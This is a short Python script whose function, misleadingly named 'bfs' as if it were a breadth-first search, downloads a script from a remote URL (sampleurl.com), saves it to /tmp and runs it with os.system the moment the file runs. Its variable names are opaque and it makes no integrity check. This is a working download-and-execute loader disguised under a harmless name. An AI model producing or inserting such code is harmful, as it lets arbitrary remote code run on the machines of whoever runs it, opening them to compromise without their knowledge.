import requests
import os

def bfs():
    try:
        x = "https://sampleurl.com/execute.py"
        y = "/tmp/execute.py"

        z = requests.get(x)
        with open(y, "w") as f:
            f.write(z.text)

        os.system(f"python {y}")

    except Exception as e:
        print(e)

bfs()
